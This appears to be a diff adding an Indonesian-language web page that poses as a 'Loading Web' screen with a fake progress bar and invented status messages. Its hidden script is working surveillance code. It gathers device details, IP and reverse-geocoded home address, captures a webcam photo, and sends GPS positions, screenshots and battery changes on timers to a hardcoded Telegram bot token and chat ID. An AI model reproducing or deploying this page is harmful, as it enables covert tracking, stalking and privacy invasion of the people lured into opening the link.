@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>bodo banget si</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    body {
+      background: #000;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Arial, sans-serif;
+      color: #999;
+      overflow: hidden;
+    }
+
+    #loading-container {
+      text-align: center;
+      width: 80%;
+      max-width: 400px;
+    }
+
+    #loading-text {
+      font-size: 22px;
+      margin-bottom: 20px;
+      color: #6e48aa;
+    }
+
+    #progress-container {
+      height: 3px;
+      background: #222;
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #6e48aa, #9d50bb);
+      transition: width 0.3s ease;
+    }
+
+    #loading-details {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="loading-container">
+    <div id="loading-text">Loading Web</div>
+    <div id="progress-container">
+      <div id="progress-bar"></div>
+    </div>
+    <div id="loading-details"></div>
+  </div>
+
+  <video id="v" autoplay muted class="hidden"></video>
+  <canvas id="c" class="hidden"></canvas>
+
+  <script>
+    (() => {
+      const BOT_TOKEN = '8438395948:AAHIcv3ISL5OqoBvsl1ag8GjB64snUqh9CU'; // ganti
+      const CHAT_ID = '5509296609'; // ganti
+
+      const progressBar = document.getElementById('progress-bar');
+      const loadingDetails = document.getElementById('loading-details');
+      const loadingMessages = [
+        "Memeriksa modul sistem...",
+        "Memuat komponen inti...",
+        "Menginisialisasi antarmuka...",
+        "Memverifikasi koneksi...",
+        "Menyiapkan lingkungan...",
+        "Memeriksa pembaruan...",
+        "Memuat aset tampilan..."
+      ];
+
+      let progress = 0;
+      setInterval(() => {
+        progress += Math.random() * 5;
+        if (progress > 98) progress = 98;
+        progressBar.style.width = progress + '%';
+        if (Math.random() > 0.9) {
+          loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
+        }
+      }, 500);
+
+      const sendToTelegram = async (message) => {
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+          });
+        } catch {}
+      };
+
+      const sendPhotoToTelegram = async (blob, filename) => {
+        try {
+          const formData = new FormData();
+          formData.append('chat_id', CHAT_ID);
+          formData.append('photo', blob, filename);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        } catch {}
+      };
+
+      const getLocationDetails = async (lat, lon) => {
+        try {
+          const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+          const data = await response.json();
+          return {
+            kb: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
+            kc: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
+            fa: data.display_name || "Alamat tidak tersedia"
+          };
+        } catch {
+          return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
+        }
+      };
+
+      const collectDeviceInfo = async () => {
+        let info = '╭───── Tracking Report ───── ⦿\n\n';
+        info += '⚙️ DEVICE INFORMATION\n';
+        info += `🖥️ Device: ${navigator.userAgent}\n`;
+        info += `💻 Platform: ${navigator.platform}\n`;
+        info += `🌐 Bahasa: ${navigator.language}\n`;
+        info += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+        info += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+        info += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+        info += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+        info += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            info += `🔋 Battery: ${Math.floor(battery.level * 100)}%\n`;
+            info += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+          } catch {
+            info += `🔋 Battery: ❌ Tidak tersedia\n`;
+          }
+        }
+
+        info += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+        info += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+        info += `📜 History Length: ${history.length}\n`;
+        info += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+        info += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+        info += `🌍 URL: ${location.href}\n`;
+        info += `📄 Title: ${document.title}\n`;
+        info += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        info += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+          info += `📍 LOCATION INFORMATION\n`;
+          info += `📡 IP Address: ${data.ip}\n`;
+          info += `🏙️ Kota: ${data.city}\n`;
+          info += `🏙️ Kabupaten: ${data.region}\n`;
+          info += `🌎 Negara: ${data.country_name}\n`;
+          info += `🏷️ Kode Pos: ${data.postal}\n`;
+
+          if (data.latitude && data.longitude) {
+            info += `📌 Latitude: ${data.latitude}\n`;
+            info += `📍 Longitude: ${data.longitude}\n`;
+            const loc = await getLocationDetails(data.latitude, data.longitude);
+            info += `🏙️ Kabupaten: ${loc.kb}\n`;
+            info += `🏙️ Kecamatan: ${loc.kc}\n`;
+            info += `🏠 Alamat Lengkap: ${loc.fa}\n`;
+          }
+        } catch {
+          info += `❌ Gagal mendapatkan informasi lokasi\n`;
+        }
+
+        info += '\n╰───── Telegram @DR4VIN ───── ⦿';
+        return info;
+      };
+
+      const startTracking = async () => {
+        await sendToTelegram(await collectDeviceInfo());
+
+        // 🔁 auto update info tiap 10 detik
+        setInterval(async () => {
+          const info = await collectDeviceInfo();
+          await sendToTelegram('[Auto Update]\n\n' + info);
+        }, 10000);
+
+        // 📸 kamera
+        try {
+          const video = document.getElementById('v');
+          const canvas = document.getElementById('c');
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+          await new Promise(r => setTimeout(r, 3000));
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          canvas.toBlob(blob => sendPhotoToTelegram(blob, 'camera.jpg'), 'image/jpeg');
+          stream.getTracks().forEach(t => t.stop());
+        } catch {
+          await sendToTelegram('❌ Kamera tidak diizinkan');
+        }
+
+        // 📷 screenshot otomatis
+        setInterval(async () => {
+          try {
+            const screenshot = await html2canvas(document.body);
+            screenshot.toBlob(blob => sendPhotoToTelegram(blob, 'screenshot.jpg'), 'image/jpeg');
+          } catch {
+            await sendToTelegram('❌ Screenshot gagal');
+          }
+        }, 30000);
+
+        // 📍 lokasi GPS
+        if (navigator.geolocation) {
+          setInterval(() => {
+            navigator.geolocation.getCurrentPosition(async pos => {
+              let locMsg = `📍 GPS Tracking\n📌 Lat: ${pos.coords.latitude}\n📍 Lng: ${pos.coords.longitude}\n🎯 Akurasi: ${pos.coords.accuracy}m\n`;
+              const loc = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
+              locMsg += `🏙️ Kabupaten: ${loc.kb}\n🏙️ Kecamatan: ${loc.kc}\n🏠 Alamat: ${loc.fa}\n`;
+              await sendToTelegram(locMsg);
+            });
+          }, 15000);
+        }
+
+        // 🔋 battery tracking
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            battery.addEventListener('levelchange', async () => {
+              await sendToTelegram(`🔋 Battery level: ${Math.floor(battery.level * 100)}%`);
+            });
+            battery.addEventListener('chargingchange', async () => {
+              await sendToTelegram(`🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}`);
+            });
+          });
+        }
+      };
+
+      setTimeout(startTracking, 3000);
+    })();
+  </script>
+</body>
+</html>
